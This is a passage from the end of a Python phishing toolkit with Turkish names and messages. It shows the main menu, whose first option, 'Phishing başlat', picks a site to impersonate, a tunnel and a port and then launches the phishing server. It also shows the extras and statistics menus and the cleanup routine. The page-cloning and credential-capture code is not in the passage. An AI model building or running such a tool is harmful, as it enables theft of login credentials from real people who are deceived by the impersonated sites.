                log_yaz("Güncelleyici modülü pasif!", "uyari")
        elif s == "8":
            if _DASHBOARD_VAR:
                dashboard_menusu()
            else:
                log_yaz("Dashboard modülü pasif!", "uyari")

# =============================================================================
# ANA MENÜ
# =============================================================================

def ana_menu():
    while True:
        ascii_art()

        print(f"{Renk.CAMGOBEGI}  [1]{Renk.SIFIRLA} Phishing başlat")
        print(f"{Renk.CAMGOBEGI}  [2]{Renk.SIFIRLA} Ek Özellikler (QR/Bildirim/İstatistik/...)")
        print(f"{Renk.CAMGOBEGI}  [3]{Renk.SIFIRLA} Hızlı istatistik göster")
        print(f"{Renk.CAMGOBEGI}  [0]{Renk.SIFIRLA} Çıkış")
        print()

        try:
            s = input(f"{Renk.YESIL}Seçim: {Renk.SIFIRLA}").strip()
        except (EOFError, KeyboardInterrupt):
            return

        if s == "0":
            return
        elif s == "1":
            secim = site_sec()
            if secim is None:
                continue
            site_isim, site_slug = secim
            tunel = tunel_sec()
            port = port_sor()
            phishing_baslat(site_isim, site_slug, tunel, port)
            print()
            try:
                input(f"{Renk.SARI}{tr('enter_devam', 'ENTER...')}{Renk.SIFIRLA}")
            except (EOFError, KeyboardInterrupt):
                pass
        elif s == "2":
            ozellikler_menusu()
        elif s == "3":
            if _STATISTICS_VAR:
                try:
                    st = Istatistik(SITES_DIR)
                    st.yazdir_ozet()
                except Exception as e:
                    log_yaz(f"Hata: {e}", "hata")
            else:
                log_yaz("İstatistik modülü pasif!", "uyari")

# =============================================================================
# TEMİZLİK
# =============================================================================

def temizlik():
    print()
    log_yaz(f"{tr('temizlik', 'Temizlik yapılıyor')}...", "info")
    for p in AKTIF_PROCESSLER:
        try:
            if p.poll() is None:
                p.terminate()
                try:
                    p.wait(timeout=3)
                except Exception:
                    p.kill()
        except Exception:
            pass
    log_yaz(f"{tr('cikis', 'Çıkış yapıldı')}.", "basari")

# =============================================================================
# MAIN
# =============================================================================

def main():
    signal.signal(signal.SIGINT, lambda s, f: (temizlik(), sys.exit(0)))
    signal.signal(signal.SIGTERM, lambda s, f: (temizlik(), sys.exit(0)))

    ascii_art()

    if not bagimliliklari_kontrol():
        sys.exit(1)

    try:
        ana_menu()
    except KeyboardInterrupt:
        pass

    temizlik()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        temizlik()
        sys.exit(0)
    except Exception as e:
        log_yaz(f"Hata: {e}", "hata")
        import traceback
        traceback.print_exc()
        sys.exit(1)
